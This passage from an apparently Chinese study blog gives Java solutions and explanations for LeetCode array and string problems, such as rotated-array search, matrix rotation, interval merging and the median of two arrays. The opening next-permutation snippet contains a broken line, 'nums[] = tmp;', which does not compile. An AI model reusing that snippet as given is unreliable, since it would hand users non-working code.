class="hljs-keyword">if</span>(nums[j - <span class="hljs-number">1</span>] &lt; nums[j])&#123;<br>            Arrays.sort(nums,j, n);<br>            <span class="hljs-comment">//找排序后第一个比nums[j - 1]大的数(尽量小的大数)</span><br>            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> k = j; k &lt; n; k++)&#123;<br>                <span class="hljs-keyword">if</span>(nums[k] &gt; nums[j - <span class="hljs-number">1</span>])&#123;<br>                    <span class="hljs-keyword">int</span> tmp = nums[j - <span class="hljs-number">1</span>];<br>                    nums[j - <span class="hljs-number">1</span>] = nums[k];<br>                    nums[] = tmp;<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>            &#125;<br>        &#125; <br>    &#125;<br>    Arrays.sort(nums);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-8-搜索旋转排序数组"><a href="#1-8-搜索旋转排序数组" class="headerlink" title="1.8 搜索旋转排序数组"></a>1.8 搜索旋转排序数组</h2><p>有序数组使用二分法解决</p><p>​        可以发现的是，我们将数组从中间分开成左右两部分的时候，一定有一部分的数组是有序的。</p><p>​        这启示我们可以在常规二分查找的时候查看当前 mid 为分割位置分割出来的两个部分 [l, mid] 和 [mid + 1, r] 哪个部分是有序的，并根据有序的那个部分确定我们该如何改变二分查找的上下界，因为我们能够根据有序的那部分判断出 target 在不在这个部分：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">search</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> target)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n = nums.length;<br>    <span class="hljs-keyword">if</span> (n == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (n == <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> nums[<span class="hljs-number">0</span>] == target ? <span class="hljs-number">0</span> : -<span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>, j = nums.length - <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">int</span> mid = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(i &lt;= j)&#123;<br>        mid = i + (j - i) / <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span>(nums[mid] == target)&#123;<br>            <span class="hljs-keyword">return</span> mid;<br>        &#125;<br>        <span class="hljs-comment">//左侧顺序</span><br>        <span class="hljs-keyword">if</span>(nums[mid] &gt;= nums[<span class="hljs-number">0</span>])&#123;<br>            <span class="hljs-comment">//目标在左侧</span><br>            <span class="hljs-keyword">if</span>(nums[<span class="hljs-number">0</span>] &lt;= target &amp;&amp; target &lt;= nums[mid])&#123;<br>                j = mid - <span class="hljs-number">1</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                i = mid + <span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-comment">//右侧顺序</span><br>            <span class="hljs-comment">//目标在右侧</span><br>            <span class="hljs-keyword">if</span>(nums[j] &gt;= target &amp;&amp; target &gt;= nums[mid])&#123;<br>                i = mid + <span class="hljs-number">1</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                j = mid - <span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br>        <br>    &#125;<br>    <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-9-旋转图像"><a href="#1-9-旋转图像" class="headerlink" title="1.9 旋转图像"></a>1.9 旋转图像</h2><p>对于矩阵中第 $i$ 行的第 $j$ 个元素，在旋转后，它出现在倒数第 $i$ 列的第 $j$ 个位置。</p><p>我们得到：</p><script type="math/tex; mode=display">\left\{\begin{aligned}&temp=matrix[n−col−1][row] \\&matrix[n−col−1][row]=matrix[n−row−1][n−col−1] \\&matrix[n−row−1][n−col−1]=matrix[col][n−row−1] \\&matrix[col][n−row−1]=matrix[row][col]\end{aligned}\right.</script><p>当我们知道了如何原地旋转矩阵之后，还有一个重要的问题在于：我们应该枚举哪些位置$ (\textit{row}, \textit{col})$\ 进行上述的原地交换操作呢？由于每一次原地交换四个位置，因此：</p><ul><li>当 n 为偶数时，我们需要枚举 $n^2 / 4 = (n/2) \times (n/2)$个位置，可以将该图形分为四块，以 $4×4 $的矩阵为例：</li><li><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/旋转图像1.png" alt="旋转图像1" style="zoom: 33%;" /></li></ul><p>保证了不重复、不遗漏；</p><p>当 n为奇数时，由于中心的位置经过旋转后位置不变，我们需要枚举$ (n^2-1) / 4 = ((n-1)/2) \times ((n+1)/2)$个位置，需要换一种划分的方式，以 $5×5$ 的矩阵为例：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/旋转图像2.png" alt="旋转图像2" style="zoom: 33%;" /></p><p>同样保证了不重复、不遗漏，矩阵正中央的点无需旋转。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">rotate</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[][] matrix)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n = matrix.length;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n / <span class="hljs-number">2</span>; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; (n + <span class="hljs-number">1</span>) / <span class="hljs-number">2</span>; ++j) &#123;<br>            <span class="hljs-keyword">int</span> temp = matrix[i][j];<br>            matrix[i][j] = matrix[n - j - <span class="hljs-number">1</span>][i];<br>            matrix[n - j - <span class="hljs-number">1</span>][i] = matrix[n - i - <span class="hljs-number">1</span>][n - j - <span class="hljs-number">1</span>];<br>            matrix[n - i - <span class="hljs-number">1</span>][n - j - <span class="hljs-number">1</span>] = matrix[j][n - i - <span class="hljs-number">1</span>];<br>            matrix[j][n - i - <span class="hljs-number">1</span>] = temp;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-10-合并区间"><a href="#1-10-合并区间" class="headerlink" title="1.10 合并区间"></a>1.10 合并区间</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[][] merge(<span class="hljs-keyword">int</span>[][] intervals) &#123;<br>    <span class="hljs-comment">// 按 start 升序排序</span><br>    Arrays.sort(intervals, (<span class="hljs-keyword">int</span>[] a, <span class="hljs-keyword">int</span>[] b) -&gt; &#123;<br>            <span class="hljs-keyword">return</span> a[<span class="hljs-number">0</span>] - b[<span class="hljs-number">0</span>];<br>    &#125;);<br>    List&lt;<span class="hljs-keyword">int</span>[]&gt; merged = <span class="hljs-keyword">new</span> ArrayList&lt;<span class="hljs-keyword">int</span>[]&gt;();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; intervals.length; i++) &#123;<br>        <span class="hljs-keyword">int</span> L = intervals[i][<span class="hljs-number">0</span>], R = intervals[i][<span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">if</span> (merged.size() == <span class="hljs-number">0</span> || merged.get(merged.size() - <span class="hljs-number">1</span>)[<span class="hljs-number">1</span>] &lt; L) &#123;<br>            <span class="hljs-comment">//结果集为空或与当前区间没有交集</span><br>            merged.add(<span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]&#123;L, R&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">//合并区间</span><br>            merged.get(merged.size() - <span class="hljs-number">1</span>)[<span class="hljs-number">1</span>] = Math.max(merged.get(merged.size() - <span class="hljs-number">1</span>)[<span class="hljs-number">1</span>], R);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> merged.toArray(<span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[merged.size()][]);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-11-颜色分类"><a href="#1-11-颜色分类" class="headerlink" title="1.11 颜色分类"></a>1.11 颜色分类</h2><p>这是一道排序题，题目要求是使用常数空间的一趟扫描算法。</p><p>使用常数空间意味着原地排序，通过比较和交换进行数据排序，即空间复杂度O(1)，时间复杂度O(n)。</p><div class="table-container"><table><thead><tr><th>排序方法</th><th>时间复杂度(平均)</th><th>时间复杂度(最坏)</th><th>时间复杂度(最好)</th><th>空间复杂度</th><th>稳定性</th><th>复杂性</th></tr></thead><tbody><tr><td>直接插入排序</td><td>O(n2)</td><td>O(n2)</td><td>O(n)</td><td>O(1)</td><td>稳定</td><td>简单</td></tr><tr><td>希尔排序</td><td>O(nlog2n)</td><td>O(n2)</td><td>O(n1.3)</td><td>O(1)</td><td>不稳定</td><td>较复杂</td></tr><tr><td>直接选择排序</td><td>O(n2)</td><td>O(n2)</td><td>O(n2)</td><td>O(1)</td><td>不稳定</td><td>简单</td></tr><tr><td>堆排序</td><td>O(nlog2n)</td><td>O(nlog2n)</td><td>O(nlog2n)</td><td>O(1)</td><td>不稳定</td><td>较复杂</td></tr><tr><td>冒泡排序</td><td>O(n2)</td><td>O(n2)</td><td>O(n)</td><td>O(1)</td><td>稳定</td><td>简单</td></tr><tr><td>快速排序</td><td>O(nlog2n)</td><td>O(n2)</td><td>O(nlog2n)</td><td>O(nlog2n)</td><td>不稳定</td><td>较复杂</td></tr><tr><td>归并排序</td><td>O(nlog2n)</td><td>O(nlog2n)</td><td>O(nlog2n)</td><td>O(n)</td><td>稳定</td><td>较复杂</td></tr><tr><td>基数排序</td><td>O(d(n+r))</td><td>O(d(n+r))</td><td>O(d(n+r))</td><td>O(n+r)</td><td>稳定</td><td>较复杂</td></tr></tbody></table></div><p>正常的排序算法没有满足的，此题的特殊条件是只有三个元素。</p><p>可以借鉴冒泡排序，冒泡排序外层循环n - 1躺，每趟将一个元素放到最终位置，这里一共三种元素，用两次遍历每次将一种元素归位。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sortColors</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n = nums.length, k = <span class="hljs-number">0</span>, tmp = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i &lt; n; i++)&#123;<br>        <span class="hljs-keyword">if</span>(nums[i] == <span class="hljs-number">0</span>)&#123;<br>            nums[i] = nums[k];<br>            nums[k++] = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = k; i &lt; n; i++)&#123;<br>        <span class="hljs-keyword">if</span>(nums[i] == <span class="hljs-number">1</span>)&#123;<br>            nums[i] = nums[k];<br>            nums[k++] = <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-12-除自身以外数组的乘积"><a href="#1-12-除自身以外数组的乘积" class="headerlink" title="1.12 除自身以外数组的乘积"></a>1.12 除自身以外数组的乘积</h2><p>同剑指offer构建乘积数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] productExceptSelf(<span class="hljs-keyword">int</span>[] nums) &#123;<br>    <span class="hljs-keyword">if</span> (nums.length == <span class="hljs-number">0</span>)&#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">0</span>];&#125;<br>    <span class="hljs-keyword">int</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[nums.length];<br>    b[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">int</span> tmp = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; nums.length; i++)&#123;<br>        b[i] = b[i-<span class="hljs-number">1</span>] * nums[i-<span class="hljs-number">1</span>];<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = nums.length - <span class="hljs-number">2</span>; i &gt;= <span class="hljs-number">0</span>; i--)&#123;<br>        <span class="hljs-comment">//tmp记录右边部分乘积</span><br>        tmp *= nums[i+<span class="hljs-number">1</span>];<br>        b[i] *= tmp;<br>    &#125;<br>    <span class="hljs-keyword">return</span> b;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-13-和为k的子数组"><a href="#1-13-和为k的子数组" class="headerlink" title="1.13 和为k的子数组"></a>1.13 和为k的子数组</h2><p>连续子数组首先考虑滑动窗口，但数组中的值允许为负数，所以滑动窗口不可行。</p><p>使用前缀和的方法求解：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">subarraySum</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> k)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n =nums.length;<br>    <span class="hljs-comment">//map&lt;前缀和，出现次数&gt;</span><br>    HashMap&lt;Integer,Integer&gt; preSum = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>    <span class="hljs-comment">//base case</span><br>    preSum.put(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">int</span> ans = <span class="hljs-number">0</span>, sum0_i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)&#123;<br>        sum0_i += nums[i];<br>        <span class="hljs-keyword">int</span> sum0_j = sum0_i - k;<br>        <span class="hljs-keyword">if</span>(preSum.containsKey(sum0_j))&#123;<br>            ans += preSum.get(sum0_j);<br>        &#125;<br>        preSum.put(sum0_i,preSum.getOrDefault(sum0_i,<span class="hljs-number">0</span>) + <span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-14-最短无序连续子数组"><a href="#1-14-最短无序连续子数组" class="headerlink" title="1.14 最短无序连续子数组"></a>1.14 最短无序连续子数组</h2><p>最简单思路是将数组排序后的结果和原数组比较</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">findUnsortedSubarray</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span>[] nums2 = Arrays.copyOf(nums, nums.length);<br>    Arrays.sort(nums);<br>    <span class="hljs-keyword">boolean</span> flag = <span class="hljs-keyword">true</span>;<br>    <span class="hljs-keyword">int</span> left = -<span class="hljs-number">1</span>, right = -<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.length; i++)&#123;<br>        <span class="hljs-keyword">if</span>(nums[i] != nums2[i])&#123;<br>            <span class="hljs-keyword">if</span>(flag)&#123;<br>                left = i;<br>                flag = !flag;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                right = i;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> right - left &gt; <span class="hljs-number">0</span> ? right - left + <span class="hljs-number">1</span> : <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-15-无重复字符的最长子串"><a href="#1-15-无重复字符的最长子串" class="headerlink" title="1.15 无重复字符的最长子串"></a>1.15 无重复字符的最长子串</h2><p>同剑指offer最长不含重复字符的子字符串</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">lengthOfLongestSubstring</span><span class="hljs-params">(String s)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> left = <span class="hljs-number">0</span>, right = <span class="hljs-number">0</span>;<br>    HashMap&lt;Character,Integer&gt; map = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>    <span class="hljs-keyword">int</span> res = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(right &lt; s.length())&#123;<br>        <span class="hljs-keyword">char</span> c = s.charAt(right);<br>        right++;<br>        <span class="hljs-comment">//更新数据</span><br>        map.put(c,map.getOrDefault(c,<span class="hljs-number">0</span>) + <span class="hljs-number">1</span>);<br>        <span class="hljs-comment">//左侧收缩</span><br>        <span class="hljs-keyword">while</span>(map.get(c) &gt; <span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-keyword">char</span> d = s.charAt(left);<br>            left++;<br>            <span class="hljs-comment">//更新数据</span><br>            map.put(d,map.get(d) - <span class="hljs-number">1</span>);<br>        &#125;<br>        res = Math.max(res,right - left);<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-16-寻找重复数"><a href="#1-16-寻找重复数" class="headerlink" title="1.16 寻找重复数"></a>1.16 寻找重复数</h2><p>同剑指offer数组中重复的数字</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">findDuplicate</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> temp;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;nums.length;i++)&#123;<br>        <span class="hljs-keyword">while</span> (nums[i]!=i)&#123;<br>            <span class="hljs-keyword">if</span>(nums[i]==nums[nums[i]])&#123;<br>                <span class="hljs-keyword">return</span> nums[i];<br>            &#125;<br>            temp=nums[i];<br>            nums[i]=nums[temp];<br>            nums[temp]=temp;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-17-搜索二维矩阵Ⅱ"><a href="#1-17-搜索二维矩阵Ⅱ" class="headerlink" title="1.17 搜索二维矩阵Ⅱ"></a>1.17 搜索二维矩阵Ⅱ</h2><p>初始化一个指向矩阵左下角的 (row，col) 指针。然后，直到找到目标并返回 true（或者指针指向矩阵维度之外的 (row，col)为止，我们执行以下操作：如果当前指向的值大于目标值，则可以 “向上” 移动一行。 否则，如果当前指向的值小于目标值，则可以移动一列。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">searchMatrix</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[][] matrix, <span class="hljs-keyword">int</span> target)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> row = matrix.length - <span class="hljs-number">1</span>, col = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(row &gt;= <span class="hljs-number">0</span> &amp;&amp; col &lt;= matrix[<span class="hljs-number">0</span>].length - <span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">if</span>(matrix[row][col] &lt; target)&#123;<br>            col++;<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(matrix[row][col] &gt; target)&#123;<br>            row--;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-18-找到字符串中所有字母异位词"><a href="#1-18-找到字符串中所有字母异位词" class="headerlink" title="1.18 找到字符串中所有字母异位词"></a>1.18 找到字符串中所有字母异位词</h2><p>开始代码是这样，但遇到长的测试用例无法通过。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Integer&gt; <span class="hljs-title">findAnagrams</span><span class="hljs-params">(String s, String p)</span> </span>&#123;<br>    HashMap&lt;Character, Integer&gt; window = <span class="hljs-keyword">new</span> HashMap();<br>    HashMap&lt;Character, Integer&gt; need = <span class="hljs-keyword">new</span> HashMap();<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">char</span> c : p.toCharArray())&#123;<br>        need.put(c, need.getOrDefault(c, <span class="hljs-number">0</span>) + <span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">int</span> left = <span class="hljs-number">0</span>, right = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> valid = <span class="hljs-number">0</span>;<br>    LinkedList&lt;Integer&gt; res = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();<br>    <span class="hljs-keyword">while</span>(right &lt; s.length())&#123;<br>        <span class="hljs-keyword">char</span> c = s.charAt(right);<br>        right++;<br>        <span class="hljs-keyword">if</span>(need.containsKey(c))&#123;<br>            window.put(c, window.getOrDefault(c, <span class="hljs-number">0</span>) + <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span>(window.get(c) == need.get(c))&#123;<span class="hljs-comment">//换成equals</span><br>                valid++;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">while</span>(right - left &gt;= p.length())&#123;<br>            <span class="hljs-keyword">if</span>(valid == need.size())&#123;<br>                res.add(left);<br>            &#125;<br>            <span class="hljs-keyword">char</span> d = s.charAt(left);<br>            left++;<br>            <span class="hljs-keyword">if</span>(need.containsKey(d))&#123;<br>                <span class="hljs-keyword">if</span> (window.get(d) == need.get(d))<span class="hljs-comment">//换成equals</span><br>                    valid--;<br>                window.put(d, window.get(d) - <span class="hljs-number">1</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><p>Integer 在大于127 的时候 不从常量池里拿，是个对象，比较的也就不是数值，所以换成equals</p><h2 id="1-19-寻找两个正序数组的中位数"><a href="#1-19-寻找两个正序数组的中位数" class="headerlink" title="1.19 寻找两个正序数组的中位数"></a>1.19 寻找两个正序数组的中位数</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">double</span> <span class="hljs-title">findMedianSortedArrays</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums1, <span class="hljs-keyword">int</span>[] nums2)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> length1 = nums1.length, length2 = nums2.length;<br>        <span class="hljs-keyword">int</span> totalLength = length1 + length2;<br>        <span class="hljs-keyword">if</span> (totalLength % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">int</span> midIndex = totalLength / <span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">double</span> median = 